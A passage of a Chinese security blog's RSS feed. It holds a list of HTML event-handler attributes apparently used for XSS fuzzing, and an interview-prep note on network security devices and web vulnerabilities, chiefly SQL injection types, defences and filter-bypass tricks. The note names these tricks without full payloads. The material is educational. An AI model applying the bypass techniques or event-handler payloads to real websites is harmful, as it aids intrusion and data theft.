class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;102&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;103&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;104&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;105&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;106&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;107&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;108&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;109&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;110&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;111&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onafterprint&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onafterscriptexecute&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onanimationcancel&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onanimationend&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onanimationiteration&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onanimationstart&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onauxclick&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onbeforecopy&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onbeforecut&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onbeforeinput&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onbeforeprint&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onbeforescriptexecute&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onbeforeunload&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onbegin&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onblur&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onbounce&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;oncanplay&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;oncanplaythrough&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onchange&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onclick&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onclose&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;oncontextmenu&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;oncopy&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;oncuechange&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;oncut&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ondblclick&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ondrag&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ondragend&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ondragenter&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ondragleave&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ondragover&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ondragstart&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ondrop&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ondurationchange&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onend&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onended&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onerror&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onfinish&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onfocus&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onfocusin&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onfocusout&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onfullscreenchange&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onhashchange&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;oninput&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;oninvalid&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onkeydown&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onkeypress&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onkeyup&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onload&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onloadeddata&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onloadedmetadata&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onloadend&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onloadstart&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onmessage&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onmousedown&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onmouseenter&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onmouseleave&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onmousemove&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onmouseout&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onmouseover&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onmouseup&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onmousewheel&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onmozfullscreenchange&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onpagehide&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onpageshow&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onpaste&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onpause&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onplay&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onplaying&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onpointerdown&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onpointerenter&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onpointerleave&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onpointermove&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onpointerout&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onpointerover&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onpointerrawupdate&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onpointerup&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onpopstate&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onprogress&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onratechange&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onrepeat&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onreset&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onresize&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onscroll&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onsearch&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onseeked&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onseeking&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onselect&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onselectionchange&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onselectstart&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onshow&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onstart&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onsubmit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ontimeupdate&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ontoggle&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ontouchend&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ontouchmove&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ontouchstart&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ontransitioncancel&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ontransitionend&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ontransitionrun&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ontransitionstart&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onunhandledrejection&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onunload&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onvolumechange&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onwebkitanimationend&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onwebkitanimationiteration&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onwebkitanimationstart&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onwebkittransitionend&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onwheel&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://ericcd.com/2022/11/30/hvv/</guid>
            <title>面经</title>
            <link>http://ericcd.com/2022/11/30/hvv/</link>
            <category term="web" scheme="http://ericcd.com/categories/web/" />
            <category term="web" scheme="http://ericcd.com/tags/web/" />
            <pubDate>Wed, 30 Nov 2022 14:26:13 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;面经总结&lt;br /&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h1 id=&#34;个人知识扫盲&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#个人知识扫盲&#34;&gt;#&lt;/a&gt; 个人知识扫盲&lt;/h1&gt;
&lt;p&gt;1.waf&lt;br /&gt;
Web 应用防护系统（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称： WAF）。利用国际上公认的一种说法：Web 应用防火墙是通过执行一系列针对 HTTP/HTTPS 的安全策略来专门为 Web 应用提供保护的一款产品。&lt;/p&gt;
&lt;p&gt;2.ips&lt;br /&gt;
 入侵防御系统 (IPS: Intrusion Prevention System) 是电脑网络安全设施，是对防病毒软件（Antivirus Programs）和防火墙 (Packet Filter, Application Gateway) 的补充。 入侵防御系统 (Intrusion-prevention system) 是一部能够监视网络或网络设备的网络资料传输行为的计算机网络安全设备，能够及时的中断、调整或隔离一些不正常或是具有伤害性的网络资料传输行为，能够帮助组织识别恶意流量，并主动阻止此类流量进入其网络。。&lt;br /&gt;
IPS 一般也是在网络层旁路，可以理解为具备阻断能力的 IDS，是 IDS 的升级版（也有 IDS 检测到攻击通知阻断设备执行阻断动作的设备联动模式），可以覆盖网络层和应用层。&lt;/p&gt;
&lt;p&gt;3.ids&lt;br /&gt;
IDS（intrusion detection system）入侵检测系统是一种对网络传输进行即时监视，在发现可疑传输时发出警报或者采取主动反应措施的网络安全设备。它与其他网络安全设备的不同之处便在于，IDS 是一种积极主动的安全防护技术。&lt;br /&gt;
IDS 工作在网络层，旁路部署，通过抓取和分析网络流量来发现攻击，主要关注网络层和传输层的数据包，如 IP、TCP、UDP 等协议。&lt;br /&gt;
产品：奇安信天眼&lt;/p&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;
&lt;p&gt;旁路部署&lt;br /&gt;
旁路部署是指安全设备在网络结构中处于旁路状态。在旁路模式下，安全设备只需要连接到交换机的指定镜像端口，所以形象的称之为 “旁路监控”；而串联模式一般是通过网关或者网桥的模式来进行监控，由于监控设备做了网关或者网桥，所以形象的称之为 “串联监控”。&lt;br /&gt;
旁路部署可以应用于防毒墙、IDS、上网行为审计、流控等很多安全设备。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;交换机&lt;br /&gt;
交换机工作在 OSI 模型的第二层，即数据链路层。 交换机的主要作用是连接多个以太网物理段，隔离冲突域，对以太网帧进行高速而透明的交换转发，自行学习和维护 MAC 地址信息。 希望这能帮到你。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;路由器&lt;br /&gt;
路由器属于 OSI 模型的第三层，即网络层。路由器的基本功能是把数据（IP 报文）传送到正确的网络，包括数据报的寻径和传送，子网隔离，抑制广播风暴，维护路由表，并与其它路由器交换路由信息，这是 IP 报文转发的基础，实现对 IP 数据报的过滤和记帐。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;交换机和路由器之间的关系&lt;br /&gt;
交换机负责连接网络设备（如交换机、路由器、防火墙、无线 AP 等）和终端设备（如计算机、服务器、摄像头、打印机等）；路由器实现局域网与局域网的互联，局域网与 Internet 的互联。&lt;br /&gt;
交换机不懂得 IP 地址，但它可以 “学习” MAC 地址，并把其存放在内部地址表中，通过在数据帧的始发者和目标接收者之间建立临时的交换路径，使数据帧直接由源地址到达目的地址。&lt;br /&gt;
普通的交换机一般工作在 OSI 七层模型的第二层 - 数据链路层，负责局域网之间的连接，而路由器工作在 OSI 的第三层 - 网络层，负责广域网之间的连接。&lt;br /&gt;
交换机都是根据 MAC 地址转发数据帧，而路由器是基于路由表转发数据包。&lt;br /&gt;
总而言之，交换机是将不同 IP 地址的电脑连在一起，共享一根网线；路由器是将同一个 IP 给不同的电脑使用，就像一条大路分成很多条小路。一句话，路由器是接外网的，交换机是接内网的。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;数据包从前端到后端的流程&lt;br /&gt;
客户端向服务器发起请求，请求会被封装成数据包。&lt;br /&gt;
数据包会经过客户端的网卡，然后通过网线传输到路由器。&lt;br /&gt;
路由器会根据目标 IP 地址，将数据包转发到下一个路由器或者直接转发到目标服务器。&lt;br /&gt;
数据包到达目标服务器后，会被服务器的网卡接收。&lt;br /&gt;
服务器会对数据包进行解析，然后根据请求内容进行处理。&lt;br /&gt;
服务器处理完请求后，会将响应结果封装成数据包，然后通过网卡发送回客户端。&lt;br /&gt;
数据包会经过路由器，然后通过网线传输到客户端的网卡。&lt;br /&gt;
客户端的网卡接收到数据包后，会将数据包传递给操作系统内核。&lt;br /&gt;
操作系统内核会对数据包进行解析，然后将响应结果交给应用程序。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;9.NAT&lt;br /&gt;
NAT 是指网络地址转换，是一种网络协议。当在专用网内部的一些主机本来已经分配到了本地 IP 地址（即仅在本专用网内使用的专用地址），但又想和因特网上的主机通信（并不需要加密）时，可使用 NAT 方法。这种方法需要在专用网（私网 IP）连接到因特网（公网 IP）的路由器上安装 NAT 软件。装有 NAT 软件的路由器叫做 NAT 路由器，它至少有一个有效的外部全球 IP 地址（公网 IP 地址）。这样，所有使用本地地址（私网 IP 地址）的主机在和外界通信时，都要在 NAT 路由器上将其本地地址转换成全球 IP 地址，才能和因特网连接。&lt;br /&gt;
NAT 的实现方式有三种，即静态转换 Static Nat、动态转换 Dynamic Nat 和端口多路复用 OverLoad&lt;br /&gt;
 静态转换是指将内部网络的私有 IP 地址转换为公有 IP 地址，IP 地址对是一对一的，是一成不变的，某个私有 IP 地址只转换为某个公有 IP 地址。借助于静态转换，可以实现外部网络对内部网络中某些特定设备（如服务器）的访问。&lt;br /&gt;
动态转换是指将内部网络的私有 IP 地址转换为公用 IP 地址时，IP 地址是不确定的，是随机的，所有被授权访问上 Internet 的私有 IP 地址可随机转换为任何指定的合法 IP 地址。也就是说，只要指定哪些内部地址可以进行转换，以及用哪些合法地址作为外部地址时，就可以进行动态转换。动态转换可以使用多个合法外部地址集。当 ISP 提供的合法 IP 地址略少于网络内部的计算机数量时。可以采用动态转换的方式。&lt;br /&gt;
端口多路复用（Port address Translation,PAT）是指改变外出数据包的源端口并进行端口转换，即端口地址转换（PAT，Port Address Translation）. 采用端口多路复用方式。内部网络的所有主机均可共享一个合法外部 IP 地址实现对 Internet 的访问，从而可以最大限度地节约 IP 地址资源。同时，又可隐藏网络内部的所有主机，有效避免来自 internet 的攻击。因此，网络中应用最多的就是端口多路复用方式。例如，假设有两个内部主机 A 和 B，它们都使用私有 IP 地址 192.168.1.1 和 192.168.1.2，并且它们都要访问外部网络。路由器使用公网 IP 地址 203.0.113.1，并且已经配置了 PAT。当主机 A 发送数据包到外部网络时，路由器会将源 IP 地址和源端口号转换为 203.0.113.1:10000，并将数据包发送到外部网络。当主机 B 发送数据包到外部网络时，路由器会将源 IP 地址和源端口号转换为 203.0.113.1:10001，并将数据包发送到外部网络。当外部网络返回数据包时，路由器会根据目标端口号将数据包转发到相应的内部主机。&lt;/p&gt;
&lt;p&gt;10.hids&lt;br /&gt;
HIDS（主机入侵检测系统）是一种监视计算机或网络中可疑活动的应用程序。监视的活动可以包括外部参与者创建的入侵，也可以包括内部资源或数据的滥用。HIDS 具有监视和分析计算系统内部方面以及其网络接口上的任何传入 / 传出网络数据包的能力。它通过监视操作系统操作、跟踪用户行为并在没有人类干预的情况下独立运行来检测主机上的恶意行为。&lt;br /&gt;
HIDS 则通过监测主机系统的系统日志、进程状态、文件变化等信息来检测安全事件，主要关注应用层和操作系统层的信息&lt;/p&gt;
&lt;p&gt;11.DOM 型 XSS 和反射型 XSS 的区别&lt;br /&gt;
 DOM 型 XSS 和反射型 XSS 的区别在于，DOM 型 XSS 不经过服务器，仅通过网页本身的 JavaScript 进行渲染触发，而反射型 XSS 是通过 URL 传递参数，服务器返回响应时，将参数中的恶意脚本代码反射回浏览器执行。DOM 型 XSS 的典型例子是在网页中插入一段恶意脚本代码，然后通过网页本身的 JavaScript 进行渲染触发。反射型 XSS 的典型例子是攻击者构造一个带有恶意脚本代码的 URL，然后将这个 URL 发送给受害者，当受害者点击这个 URL 时，恶意脚本代码就会被执行。&lt;/p&gt;
&lt;ol start=&#34;12&#34;&gt;
&lt;li&gt;内网 ip 和外网 ip 的区别&lt;br /&gt;
一般来说，10 开头的 IP 都是内网 IP，即 10.0.0.0 到 10.255.255.255 是内网 IP。而以下 IP 段的地址都是内网 IP 地址：172.16.0.0 到 172.31.255.255、192.168.0.0 到 192.168.255.255、169.254.x.x（其中 x.x 为任意数字）。如果您想判断一个 ip 是公网 IP 还是私网 ip，可以登录百度，搜索 IP 得到一个本机的外网 IP。然后打开路由器（确切的说是网关，网关可能是光猫也可能是路由器），然后登陆进入查看 WAN IP，这个是路由器连接上层网络的 IP。若 WAN IP 和百度查到的外网 IP 一致，那么这个就是公网 ip 了。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;13.Kerboeros 协议&lt;br /&gt;
 Kerberos 协议是一种网络认证协议，用于在计算机网络上进行身份验证。它提供了一种安全的身份验证机制，以防止未经授权的访问。&lt;br /&gt;
Kerberos 协议的基本原理是：用户向 Kerberos 服务器请求一个票据，该票据用于向其他服务器证明用户的身份。Kerberos 服务器使用用户的密码来生成票据，并将其发送回用户。用户可以使用该票据来访问其他服务器，而无需再次输入密码。&lt;br /&gt;
通过过滤出 kerboros 流量，我们在 req-body 字段中，可以找到 clientName 的值，表示的就是 pc 的用户名，serverName 的两个字段一个表示服务用户名，一个是就是域名。&lt;/p&gt;
&lt;p&gt;14.DHCP&lt;br /&gt;
DHCP 协议是一种网络协议，用于在 TCP/IP 网络上分配 IP 地址。DHCP 代表动态主机配置协议。DHCP 协议允许计算机在网络上自动获取 IP 地址，而无需手动配置。DHCP 还提供了其他信息，例如子网掩码、默认网关和 DNS 服务器的地址。DHCP 服务器是负责分配 IP 地址的服务器。DHCP 客户端是需要 IP 地址的计算机。可以帮助识别连接到网络的计算机的主机名、MAC 地址和 IP 地址。在 hostname 字段中可以找到主机名，在 clientMac 字段中可以找到主机的 mac 地址，这样我们就能把主机 - 主机 mac 地址 - IP 地址给关联起来，可以描述出网络中的主机拓扑结构。&lt;/p&gt;
&lt;p&gt;15.dict 协议&lt;br /&gt;
 Dict 协议是一个在线网络字典协议，这个协议是用来架设一个字典服务的。Dict 服务器和客户机使用 TCP 端口 2628。Dict 协议是基于查询响应的 TCP 协议，它的目标是超越 Webster protocol，并允许客户端在使用过程中访问更多字典 12.&lt;/p&gt;
&lt;p&gt;16.redis 服务&lt;br /&gt;
 Redis 是一个使用 ANSI C 编写的开源、包含多种数据结构、支持网络、基于内存、可选持久性的键值对存储数据库。它是一种 NoSQL 数据库，具有高性能、可扩展性强、高可用等优点，受到广泛开发人员和仓库管理人员的青睐。Redis 支持分布式，理论上可以无限扩展，是现在最受欢迎的 NoSQL 数据库之一。&lt;/p&gt;
&lt;p&gt;17.gopher 协议&lt;br /&gt;
 gopher 协议是一个古老且强大的协议，可以理解为是 http 协议的前身，他可以实现多个数据包整合发送。通过 gopher 协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求。&lt;/p&gt;
&lt;h1 id=&#34;web-top-10&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web-top-10&#34;&gt;#&lt;/a&gt; Web Top 10&lt;/h1&gt;
&lt;h2 id=&#34;sql-注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sql-注入&#34;&gt;#&lt;/a&gt; SQL 注入&lt;/h2&gt;
&lt;h3 id=&#34;原理&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#原理&#34;&gt;#&lt;/a&gt; 原理&lt;/h3&gt;
&lt;p&gt;由于程序没有细致的过滤用户输入的数据，造成 SQL 字符串拼接，进而恶意的 SQL 语句被执行，造成数据库信息泄露，网页篡改，数据库被恶意操作等。&lt;/p&gt;
&lt;h3 id=&#34;挖掘&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#挖掘&#34;&gt;#&lt;/a&gt; 挖掘&lt;/h3&gt;
&lt;p&gt;SQL 注入漏洞的位置有很多，但是最常见的是在 Web 应用程序中的输入字段，例如登录表单、搜索表单、注册表单等。攻击者可以通过在这些输入字段中注入恶意代码来执行 SQL 命令，从而获取敏感数据或控制数据库。此外，SQL 注入漏洞还可能存在于 Web 应用程序中的其他位置，例如 URL 参数、HTTP 标头、Cookie 等。&lt;/p&gt;
&lt;h3 id=&#34;方法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#方法&#34;&gt;#&lt;/a&gt; 方法&lt;/h3&gt;
&lt;p&gt;联合注入、报错注入、延时注入、布尔注入、DNS 注入、宽字节注入、堆叠注入，二次注入。&lt;/p&gt;
&lt;h3 id=&#34;防御&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#防御&#34;&gt;#&lt;/a&gt; 防御&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;输入验证：对用户输入进行验证，只允许输入预期的数据类型和长度。（正则过滤）&lt;/li&gt;
&lt;li&gt;参数化查询：使用参数化查询可以防止 SQL 注入攻击。参数化查询是指将 SQL 语句和参数分开处理，参数不会被解释为 SQL 语句的一部分。（php 转义、预编译）&lt;/li&gt;
&lt;li&gt;最小权限原则：数据库用户应该只被授予最小权限，以限制攻击者能够访问的数据。&lt;/li&gt;
&lt;li&gt;防火墙：使用防火墙可以限制对数据库的访问，只允许来自特定 IP 地址或端口的请求。&lt;br /&gt;
5.waf 设备&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#绕过&#34;&gt;#&lt;/a&gt; 绕过&lt;/h3&gt;
&lt;h4 id=&#34;关键字过滤&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#关键字过滤&#34;&gt;#&lt;/a&gt; 关键字过滤&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;大小写转换&lt;/li&gt;
&lt;li&gt;注释符绕过：--， /**/，#(%23)&lt;/li&gt;
&lt;li&gt;内联注释绕过：/&lt;em&gt;!select&lt;/em&gt;/（注释中的语句为 MYSQL 特有的语句，这些语句在其它数据库中不会运行，但会在 MYSQL 中运行）&lt;/li&gt;
&lt;li&gt;双关键字绕过&lt;/li&gt;
&lt;li&gt;编码绕过&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;空格过滤&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#空格过滤&#34;&gt;#&lt;/a&gt; 空格过滤&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;使用注释符&lt;/li&gt;
&lt;li&gt;两个空格&lt;/li&gt;
&lt;li&gt;使用 ()&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;判断数据库类型&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#判断数据库类型&#34;&gt;#&lt;/a&gt; 判断数据库类型&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;页面报错信息&lt;/li&gt;
&lt;li&gt;查询数据库独有的数据表&lt;/li&gt;
